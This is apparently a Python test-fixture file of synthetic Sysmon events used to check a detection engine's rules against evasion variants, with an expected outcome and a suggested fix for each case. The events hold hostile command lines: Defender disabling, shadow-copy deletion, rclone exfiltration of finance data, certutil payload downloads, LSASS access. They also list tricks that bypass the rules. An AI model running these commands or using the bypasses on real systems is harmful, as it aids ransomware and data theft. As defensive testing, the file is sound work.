"""
Evasion test cases (roadmap F29): variants of attack telemetry that try to slip past a rule.

Each case is a synthetic event (command-line and process fields only; nothing here
runs) plus the outcome the detection engine actually produces. ``expect`` records
that outcome, ``detected`` or ``bypass``, and tests/test_evasion.py fails if the
engine disagrees, so docs/EVASION.md cannot drift from reality. When a rule is
improved and a bypass closes, flip ``expect`` and the doc regenerates.
"""

SYSMON = "Microsoft-Windows-Sysmon/Operational"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"  # truncated, inert base64 text


def proc(image, cmd, parent=r"C:\Windows\System32\cmd.exe", **extra):
    return {"event_id": 1, "event_source": SYSMON,
            "details": {"Image": image, "CommandLine": cmd, "ParentImage": parent, **extra}}


def access(source, granted):
    return {"event_id": 10, "event_source": SYSMON,
            "details": {"SourceImage": source, "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": granted}}


CASES = [
    # --- SOC-RULE-004 obfuscated PowerShell
    {"id": "EV-01", "rule": "SOC-RULE-004", "technique": "T1059.001", "trick": "Mixed-case parameter name",
     "event": proc(PS, f"powershell.exe -eNcOdEdCoMmAnD {B64}"), "expect": "detected",
     "note": "Sigma string matching is case-insensitive."},
    {"id": "EV-02", "rule": "SOC-RULE-004", "technique": "T1059.001", "trick": "Abbreviated parameter (-ec)",
     "event": proc(PS, f"powershell.exe -ec {B64}"), "expect": "bypass",
     "note": "PowerShell accepts any unambiguous prefix (-e, -ec, -enco). Fix: match a regex such as "
             r"`\s-e(c|nc|nco|ncod|ncode|ncoded|ncodedc\w*)?\s` instead of fixed strings."},
    {"id": "EV-03", "rule": "SOC-RULE-004", "technique": "T1059.001", "trick": "En dash instead of hyphen",
     "event": proc(PS, f"powershell.exe \u2013EncodedCommand {B64}"), "expect": "bypass",
     "note": "PowerShell treats en/em dashes as parameter prefixes. Fix: match `EncodedCommand` without the dash."},
    {"id": "EV-04", "rule": "SOC-RULE-004", "technique": "T1036.003", "trick": "Renamed powershell.exe",
     "event": proc(r"C:\Users\Public\svcupdate.exe", f"svcupdate.exe -EncodedCommand {B64}",
                   OriginalFileName="PowerShell.EXE"), "expect": "bypass",
     "note": "The rule keys on Image. Fix: also match OriginalFileName (Sysmon records it); tracked in GAPS.md as T1036.003."},
    {"id": "EV-05", "rule": "SOC-RULE-004", "technique": "T1059.001", "trick": "pwsh.exe instead of powershell.exe",
     "event": proc(r"C:\Program Files\PowerShell\7\pwsh.exe", f"pwsh -EncodedCommand {B64}"), "expect": "detected",
     "note": "Both binaries are in the rule."},
    # --- SOC-RULE-005 Defender tampering
    {"id": "EV-06", "rule": "SOC-RULE-005", "technique": "T1562.001", "trick": "Lower-case cmdlet",
     "event": proc(PS, "powershell set-mppreference -disablerealtimemonitoring $true"), "expect": "detected",
     "note": "Case-insensitive match."},
    {"id": "EV-07", "rule": "SOC-RULE-005", "technique": "T1562.001", "trick": "Policy registry value via reg.exe",
     "event": proc(r"C:\Windows\System32\reg.exe",
                   r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'),
     "expect": "bypass",
     "note": "Same effect, different binary. Fix: a registry_set rule on the Defender policy keys (needs Sysmon Event 13)."},
    # --- SOC-RULE-001 LSASS access
    {"id": "EV-08", "rule": "SOC-RULE-001", "technique": "T1003.001", "trick": "PROCESS_ALL_ACCESS (0x1FFFFF)",
     "event": access(r"C:\Users\Public\tool.exe", "0x1FFFFF"), "expect": "bypass",
     "note": "The rule lists 0x1010, 0x1400 and 0x1F0FFF only. Fix: add 0x1FFFFF and other masks with PROCESS_VM_READ (0x10)."},
    {"id": "EV-09", "rule": "SOC-RULE-001", "technique": "T1036.005", "trick": "Source binary named svchost.exe outside System32",
     "event": access(r"C:\Users\Public\svchost.exe", "0x1010"), "expect": "bypass",
     "note": "The filter trusts any path ending in \\svchost.exe. Fix: filter on the full System32 path."},
    # --- SOC-RULE-019 shadow copy deletion
    {"id": "EV-10", "rule": "SOC-RULE-019", "technique": "T1490", "trick": "Upper-case arguments",
     "event": proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe DELETE SHADOWS /ALL /QUIET"), "expect": "detected",
     "note": "Case-insensitive match."},
    {"id": "EV-11", "rule": "SOC-RULE-019", "technique": "T1490", "trick": "Two spaces between verb and object",
     "event": proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete  shadows /all /quiet"), "expect": "bypass",
     "note": "The rule matches the literal 'delete shadows'. Fix: contains|all on 'delete' and 'shadows'."},
    {"id": "EV-12", "rule": "SOC-RULE-019", "technique": "T1490", "trick": "CIM cmdlets instead of WMI Delete()",
     "event": proc(PS, "powershell Get-CimInstance Win32_ShadowCopy | Remove-CimInstance"), "expect": "bypass",
     "note": "The PowerShell branch needs the word 'Delete'. Fix: also accept Remove-CimInstance / Remove-WmiObject."},
    # --- SOC-RULE-039 rclone exfiltration
    {"id": "EV-13", "rule": "SOC-RULE-039", "technique": "T1567.002", "trick": "Renamed rclone, known cloud remote",
     "event": proc(r"C:\Users\Public\svc.exe", r"svc.exe copy D:\Finance mega:drop -q"), "expect": "detected",
     "note": "The remote-name branch does not depend on the binary name."},
    {"id": "EV-14", "rule": "SOC-RULE-039", "technique": "T1567.002", "trick": "Renamed rclone, custom remote name",
     "event": proc(r"C:\Users\Public\svc.exe", r"svc.exe copy D:\Finance backup01:q4 -q"), "expect": "bypass",
     "note": "Remote names are user-defined in rclone.conf. Fix: match OriginalFileName/hash of rclone, or network telemetry."},
    # --- SOC-RULE-014 certutil
    {"id": "EV-15", "rule": "SOC-RULE-014", "technique": "T1105", "trick": "Alternative download verb (-verifyctl)",
     "event": proc(r"C:\Windows\System32\certutil.exe", "certutil -verifyctl -split -f http://203.0.113.9/a.bin"),
     "expect": "bypass",
     "note": "certutil can fetch URLs with several verbs. Fix: also match 'http' in the command line of certutil."},
    {"id": "EV-16", "rule": "SOC-RULE-014", "technique": "T1036.003", "trick": "Renamed certutil.exe",
     "event": proc(r"C:\Users\Public\cu.exe", "cu.exe -urlcache -split -f http://203.0.113.9/a.bin a.exe",
                   OriginalFileName="CertUtil.exe"), "expect": "bypass",
     "note": "Keyed on Image only. Fix: also match OriginalFileName."},
]
